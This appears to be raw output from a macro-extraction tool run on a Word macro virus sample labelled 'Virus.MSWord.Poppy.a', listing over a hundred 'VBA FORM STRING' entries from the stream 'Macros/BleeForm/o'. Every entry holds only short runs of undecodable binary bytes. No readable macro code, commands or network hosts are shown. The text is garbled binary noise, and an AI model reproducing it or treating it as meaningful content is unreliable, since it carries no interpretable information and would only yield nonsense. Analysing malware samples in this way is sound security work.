VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j>��*n�Z-ju6����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����`'#"1���8� P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��׎��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6+c��u�Ƈ���)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9\������y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3��`J�3��c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C��@-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���/�~����-Kا
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����;�i���\d��Fy!����������]#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k'���)(�1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ؐs�?�Uc�r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2��)��8<ʣ�����-41T;
#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<��x!O9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��8>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9:H���6V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�=�|3���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X��WG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|�ݸg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5��������f�<��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��	)&%���V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�~s������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$�:J�I�V�H�e0Sƛ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�',���|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��
�!���Ċ�H�Uܣ�?)�Tzf����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p|�U�,���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#�������i�j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$��@8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c����1��N+�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d���R� �2OK���&����`EME8��2�r�G��$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�vG̛q�VM��$��W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�q�m +���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rH9,}�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�20~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���_��c�L���Vb���8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
挂�j2�Ȭgv
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��p@��=:g���U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o@�6lo7?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!y#�}1�.��-���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�',<��o0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����^�������L�'�A�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��rx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����C�Ut�_�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%dke"�j)��8�.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<p��>�_A���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.:����}5B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ȗy\a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(��嘒~N@�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:L�ZS\+����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�q�s���x,���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7j�Ro�d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �s�q�z�����m�쬸?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nv]?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9�!��D�m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����+%Me�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��IPT���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{c#�K�셮�3In���H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�̠�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ҥz��G�z�4�h����nuz��wva
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]�}����8��Pӽ��t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����S²d/����/?o�TQ���eĕ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N/߇�o5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�봖$vng��X]}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x,֚r������tR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��L�α�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"C�=K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���yl�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ƒm��%G���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[)��A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��üy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�׌q�Lܩ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�~�3�a`�,��~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��yw��v��8M3%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_���@�E>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�p~��})W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:ĻP+.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CR��s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �㝥��垪V��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��b�����m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?L��x��g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F�Z���᲏&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;ۨY������F���ì�ޜ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[ƒi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
F]�.pW�D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�.wFt�ϭ���wP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}1&O��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j5�1_4E%HW;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pA�A���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�'y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�DU0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�<���h*#�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��լ�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BMVs/�$�懻�â�/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H⩞?&E܎
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?n��K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�7-�	k�S"۩���/��G��z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^�+߇�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C��W[u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�Z'3Rɷ,K�M�wrGˌ/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ۻ�ܞ�w&M_�>ފ����=$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��$�y=Y��!�F�^
�'��v($�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�կ�*��z{%Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!	����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\s����-«�"�~(��,߻��N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>�����>;�aOo��imIJ�#,�ںi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V���^[`};�=U_]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`���<QD�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*ޠ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OO��曧
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`᳿�a�o�Ԗ��CE\�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.��Icq���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V=b���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q{Е����y�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4D���Z7��f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�nU���'uX�V`9����A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LQ���~���j�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k������(h�!<��EL�*b<� 8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�D�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
��Ƒ�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:ڎ�{�-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t��nv��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
